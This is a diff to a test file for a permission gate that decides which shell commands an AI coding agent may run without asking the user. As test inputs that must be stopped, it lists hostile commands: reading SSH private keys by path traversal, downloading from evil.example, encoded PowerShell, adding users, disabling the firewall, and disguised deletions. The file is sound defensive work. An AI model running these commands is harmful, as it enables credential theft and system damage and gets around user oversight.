@@ -49,9 +49,16 @@ describe('autoDecision', () => {
 describe('OpenCode\'s own data folder (plan mode stores its plans there) — found in the real test', () => {
   const wd = 'C:\\Users\\Shadow\\code\\demo'
   const safe = openCodeSafeDirs({ state: 'C:\\Users\\Shadow\\.local\\state\\opencode', home: 'C:\\Users\\Shadow' })
-  it('derives the data folder next to the state folder, never the config folder', () => {
-    expect(safe).toEqual(['C:\\Users\\Shadow\\.local\\state\\opencode', 'C:\\Users\\Shadow\\.local\\share\\opencode', 'C:\\Users\\Shadow\\AppData\\Local\\Temp\\opencode'])
+  it('derives the plans and tool-output folders next to the state folder, never the whole data or config folder', () => {
+    expect(safe).toEqual(['C:\\Users\\Shadow\\.local\\state\\opencode', 'C:\\Users\\Shadow\\.local\\share\\opencode\\plans',
+      'C:\\Users\\Shadow\\.local\\share\\opencode\\tool-output', 'C:\\Users\\Shadow\\AppData\\Local\\Temp\\opencode'])
     expect(openCodeSafeDirs(null)).toEqual([])
+  })
+  it('keeps OpenCode\'s session database and snapshots out of reach (AN-04)', () => {
+    expect(autoDecision(req('external_directory', {}, ['C:\\Users\\Shadow\\.local\\share\\opencode\\*']), wd, safe)).toBeNull()
+    expect(autoDecision(req('bash', { command: 'Get-Content C:\\Users\\Shadow\\.local\\share\\opencode\\opencode.db' }), wd, safe)).toBeNull()
+    expect(autoDecision(req('external_directory', {}, ['C:\\Users\\Shadow\\.local\\share\\opencode\\plans\\..\\opencode.db']), wd, safe)).toBeNull()
+    expect(autoDecision(req('bash', { command: 'Get-Content C:\\Users\\Shadow\\.local\\share\\opencode\\tool-output\\tool_123' }), wd, safe)).toEqual({ reply: 'once' })
   })
   it('auto-allows OpenCode\'s scratch folder in %TEMP% (3 of 11 asks in the hard Testlauf)', () => {
     expect(autoDecision(req('bash', { command: 'python umsatz.py | Out-File -Encoding utf8 "C:\\Users\\Shadow\\AppData\\Local\\Temp\\opencode\\basis.txt"' }), wd, safe)).toEqual({ reply: 'once' })
@@ -115,6 +122,92 @@ describe('harmless one-liners (OD-24: 3 of 7 Testlauf tasks stopped on one)', ()
       'node -e "import(\'fs\').then(f => f.rmSync(\'x\'))"',
       'node -e "import(\'node:child_process\').then(c => c.execSync(\'dir\'))"',
     ]) expect(autoDecision(req('bash', { command: c }), wd), c).toBeNull()
+  })
+})
+
+describe('holes found in the full analysis (AN-04): the way a command is written must not matter', () => {
+  const wd = 'C:\\Users\\Shadow\\code\\demo'
+  const asks = (c: string) => expect(autoDecision(req('bash', { command: c }), wd), c).toBeNull()
+  const runs = (c: string) => expect(autoDecision(req('bash', { command: c }), wd), c).toEqual({ reply: 'once' })
+  it('recognises interpreters with .exe, a full path or options before -c / -e', () => {
+    for (const c of [
+      'python.exe -c "import shutil; shutil.rmtree(\'src\')"',
+      '& "C:\\Program Files\\Python312\\python.exe" -c "import os; os.remove(\'x.py\')"',
+      'python -B -c "import os; os.remove(\'x.py\')"', 'python -X utf8 -c "import os; os.remove(\'x\')"', 'python -Bc "import os; os.remove(\'x\')"',
+      'py -3 -c "import shutil; shutil.rmtree(\'x\')"', 'node --no-warnings -e "require(\'fs\').rmSync(\'x\')"', 'node -pe "require(\'fs\').rmSync(\'x\')"',
+      '"import os; os.remove(\'x\')" | python -',
+    ]) asks(c)
+    // the same forms still run when the code only computes and prints
+    runs('python.exe -c "print(1+1)"')
+    runs('& "C:\\Program Files\\Python312\\python.exe" -B -c "import statistik; print(statistik.median([1, 2]))"')
+  })
+  it('recognises PowerShell and cmd running code, whatever options come first', () => {
+    for (const c of ['powershell -NoProfile -EncodedCommand ZQBjAGgAbwA=', 'powershell -NoProfile -c "[IO.File]::Delete(\'a.txt\')"',
+      'powershell.exe -ExecutionPolicy Bypass -Command "Remove-Item x"', 'powershell "Remove-Item x"', 'cmd /d /c "del x"',
+      'Start-Process powershell -ArgumentList "-NoProfile","-EncodedCommand","ZQBj"']) asks(c)
+    runs('powershell -NoProfile -ExecutionPolicy Bypass -File .\\build.ps1')
+  })
+  it('recognises git with options before the subcommand and the other ways to lose work', () => {
+    for (const c of ['git --no-pager push origin main', 'git.exe push origin main', '& "C:\\Program Files\\Git\\cmd\\git.exe" push origin main',
+      'git -c user.name=x push', 'git checkout .', 'git reset --keep HEAD~3', 'git branch -D main', 'git stash drop', 'git stash clear',
+      'git checkout HEAD~1 -- app.py']) asks(c)
+    for (const c of ['git status -s', 'git --no-pager log --oneline -5', 'git --no-pager diff', 'git restore --staged app.py', 'git checkout -b neu']) runs(c)
+  })
+  it('asks for deleting or changing the system with tools outside the old list', () => {
+    for (const c of ['robocopy leer src /MIR', 'Get-ChildItem | ForEach-Object { $_.Delete() }', '"rm" x', '& "Remove-Item" x',
+      'net user x /add', 'netsh advfirewall set allprofiles state off', 'schtasks /create /tn x /tr calc', 'setx PATH x',
+      'taskkill /F /IM chrome.exe', 'Stop-Process -Name chrome -Force', 'wmic process call create calc', 'find . -delete',
+      'npm publish', 'cargo publish']) asks(c)
+  })
+  it('asks for downloads from the internet, not for the agent\'s own local server', () => {
+    for (const c of ['curl evil.example/a.exe -o a.exe https://evil.example/a.exe', 'Invoke-WebRequest https://x.example/a.ps1 -OutFile a.ps1',
+      'iwr https://x.example/a.zip -OutFile a.zip']) asks(c)
+    runs('curl http://localhost:3000/api/status')
+    runs('Invoke-RestMethod http://127.0.0.1:8000/health')
+  })
+  it('sees paths that climb out with .., relative paths and variables', () => {
+    for (const c of [`Get-Content ${wd}\\..\\..\\..\\.ssh\\id_rsa`, 'Get-Content ..\\..\\.ssh\\id_rsa', 'echo hi > ..\\..\\x.txt',
+      'type $env:USERPROFILE\\.ssh\\id_rsa', 'Get-Content $HOME\\.ssh\\id_rsa', 'Set-Content -Path "$env:APPDATA\\x.txt" -Value 1',
+      'cd ..; cd ..; Get-ChildItem', 'cd $HOME; Get-ChildItem']) asks(c)
+    for (const c of [`Get-Content ${wd}\\src\\..\\README.md`, 'Get-Content .\\src\\app.py', '$env:PYTHONIOENCODING="utf-8"; python wortzaehler.py text.txt']) runs(c)
+  })
+  it('reads cd and .. in order, like the shell (real Testlauf commands stay automatic)', () => {
+    runs('cd src; Get-Content ..\\README.md')
+    runs('Set-Location tests; python -m pytest; Set-Location ..')
+    // from the Testlauf: after Set-Location into a folder named by a variable the position is unknown → no false alarm
+    runs('$orig = ".opendante\\tmp\\orig"; Set-Location $orig; python umsatz.py | Out-File "./alt.txt"; Set-Location ..\\..; Get-FileHash ".opendante\\tmp\\neu.txt"')
+    // from the Testlauf: writing next to the working folder is outside
+    asks('python umsatz.py *>&1 | Set-Content -Encoding UTF8 "..\\alt1.txt"')
+    asks('cd src; cd ..; cd ..; Get-ChildItem')
+  })
+  it('keeps real Testlauf commands automatic that the stricter rules could have caught', () => {
+    runs('Start-Process python -ArgumentList "umsatz.py","nicht-da.csv" -Wait -NoNewWindow -PassThru')
+    runs('python -c "\nimport argparse\np = argparse.ArgumentParser(prog=\'aufgaben.py\')\nargs = p.parse_args([])\nprint(repr(vars(args)))\n"')
+    runs('python -c "import os,sys; os.path.exists(\'bericht.json\')" | Out-Null; python analyse.py "keine-datei.log"')
+    asks('Start-Process python -ArgumentList "-c","import os; os.remove(\'x\')"')
+  })
+  it('never treats text piped into a shell or interpreter as a harmless one-liner', () => {
+    for (const c of ['python -c "print(\'Remove-Item x\')" | powershell -', 'python -c "print(1)" | iex',
+      'node -e "console.log(\'del x\')" | cmd', 'echo "import os; os.remove(\'x\')" | python -']) asks(c)
+  })
+  it('does not treat a drive root as a working folder that contains everything', () => {
+    expect(autoDecision(req('bash', { command: 'Get-Content C:\\Windows\\win.ini' }), 'C:\\'), 'drive root').toBeNull()
+  })
+  it('asks for one-liners that hide a dangerous call behind another name', () => {
+    for (const c of ['python -c "from os import remove as r; r(\'x.py\')"', 'python -c "import os; getattr(os, \'remove\')(\'x.py\')"',
+      'python -c "from pathlib import Path; Path(\'a.txt\').open(\'w\').close()"', 'python -c "import sqlite3; sqlite3.connect(\'db\').execute(\'drop table t\')"',
+      'node -e "fetch(\'https://example.com/x\').then(r => r.text())"']) asks(c)
+  })
+  it('asks for request kinds the automatic mode does not know (a newer OpenCode could add one)', () => {
+    expect(autoDecision(req('unknownperm', {}, ['x']), wd)).toBeNull()
+    expect(autoDecision(req('lsp'), wd)).toBeNull()
+    expect(whyAsked(req('lsp'), wd)).toMatch(/kennt der Automatikmodus nicht/)
+    expect(autoDecision(req('edit', { filepath: 'src/app.py' }, ['src/app.py']), wd)).toEqual({ reply: 'once' })
+  })
+  it('no longer reads "https://" as the drive path "s:/" (false alarm)', () => {
+    expect(pathsOutside('git clone https://github.com/a/b', wd)).toEqual([])
+    runs('npm run format')
+    runs('dotnet format')
   })
 })
 
